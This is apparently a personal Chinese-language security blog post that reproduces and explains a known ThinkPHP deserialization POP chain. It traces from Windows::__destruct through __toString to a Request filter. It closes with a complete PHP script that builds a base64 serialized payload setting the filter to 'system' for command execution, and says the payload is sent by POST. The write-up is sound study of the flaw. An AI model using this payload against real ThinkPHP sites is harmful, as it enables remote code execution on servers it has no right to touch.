---
layout:     post                    # 使用的布局（不需要改）
title:      Thinkphp反序列化利用链深入分析 # 标题 
subtitle:   一些新的思路与手段 #副标题
date:       2019-12-15              # 时间
author:     LessterWong             # 作者
header-img: img/post-bg-universe.jpg   #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - PHP
    - Web
    - Security
---

### 前言
>好像稍微拖得有点久了QwQ

第二篇笔记，加油加油！

这次更新时间间隔稍微有点长，表示歉意~目前的学习过程中暴露出很多的问题，如docker工具使用不熟练、问题切入点不好寻找等，php的学习也遇到了瓶颈，慢慢加油吧~没有上过网络礼包的我也要加快网络方面知识的学习了。

这次的工作，是是跟随[https://paper.seebug.org/1040/](https://paper.seebug.org/1040/) 中的内容复现出该漏洞并进行一些探讨和分析。

### Thinkphp 反序列化利用链深入分析
>思路非常的有趣

#### 总体思路
这次我们所面对的同样是一个反序列化的漏洞，由于漏洞触发的代码不在魔术方法中，我们需要和上篇博客中进行一样的操作：构造pop链来将类属性与敏感函数的属性联系起来。在整个过程中，都是以寻找对应的魔术方法作为突破口，不过这次的pop链构造过程略微有些复杂，触发漏洞的过程也有一定的操作难度。

#### 利用链的构建
这个漏洞起始于某个类的__destruct()方法：

```
public function __destruct()
{
    $this->close();
    $this->removeFiles();
}
```

我们追踪到removeFiles函数中，发现内容如下：
```
class Windows extends Pipes
{
    private $files = [];
    ....
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    ....
}
```

使用了`$this->files`，且`$files`是可控的。作为一个小白，还是不太能够直观的分辨出某一个变量是否是“可控”的，初步理解为这个变量只需要构建特殊的输入就可以拥有我们所希望其拥有的值。初步认为所有具有“$this->”格式的变量都是“可控”的，因为可以直接通过`__construct()`来给该变量赋值。于是我们找到了第一个需要控制的变量`$files`与它的位置 Windows。

而在`removeFiles()`函数中，`file_exist()`函数会将`$filename`当作字符串来处理，因此在这里我们需要寻找一个__toString方法的漏洞来在处理过程中触发。于是我们全局搜索后找到`\thinkphp\library\think\model\concern\Conversion.php`中的`__toString()`函数，沿着里面调用的函数`toJson()`一步一步向下查找，并在Attribute类中找到了`getRelation()`方法，再往下逐层寻找，最终在`getData`函数中找到了利用终点`$this->data[$name]`。data就是我们需要控制的变量之一了。

现在来总结一下：我们需要控制三个变量：类Windows中的`$files`（需要删除的文件路径），类Conversation中的`$append`（一个判断的条件，满足该条件才能进行进一步的函数调用），类Attribute中的`$data`（利用链的终点）。现在所缺的就是通过use关键字来集成类Conversation和类Attribute的一个类(这样就可以在一个类中构造我们的payload)。

通过搜索我们发现了符合条件的类，位于`\thinkphp\library\think\Model.php`：

```
abstract class Model implements \JsonSerializable, \ArrayAccess
{
    use model\concern\Attribute;
    use model\concern\RelationShip;
    use model\concern\ModelEvent;
    use model\concern\TimeStamp;
    use model\concern\Conversion;
    .......
```

#### 代码执行点的分析

通常的思路是再去找一个反序列化的漏洞，而这篇文章中采用了另外的一个方法：尝试覆盖某个功能。当系统尝试去调用这个功能时，会直接跳我们设计的假功能。这里选择了尝试覆盖Request类中的`filter`功能。

在这里找到的首先是`filterValue`函数：

```
  ....
  private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            }
            .....
```

这里依然是一层一层找漏洞的，但和上面沿着可控的链一直往下找有所区别，这里的思路是一直找直至找到`$value`可控的位置。我们发现了`input`函数中存在`$this->filterValue($data, $name, $filter);`的内容，可以控制`value`的值，而`input`函数的参数本身又是不可控的。于是我们再去寻找可以控制`input`函数参数的函数（好像有点绕）。于是我们用这个思路一路找到了`param`函数、`isAjax`函数。`isAjax`明显是可控的，于是倒推回去是可以控制`input`中的`$name`。这就离控制`filterValue`中的`$value`又近了一步。确实相当的精妙。于是下一个任务就是回到`input`函数中，补上剩下的拼图。

发现`input`函数中：`$data = $this->getData($data, $name);` 我们得到`$value`需要控制`$data`，现在就要控制`$name`。于是再一次进行跟进工作，最后就可以构造出来payload啦。

```
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["calc.exe","calc"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

把payload通过POST传过去，就可以利用漏洞了。

### 总结
这一次的反序列化过程中，用了两个不太思路完全不同的跟进方法，从两个不同的方向相互靠拢并最终完成了漏洞的利用工作，确实非常的精妙，给我提供了很多新的思路。
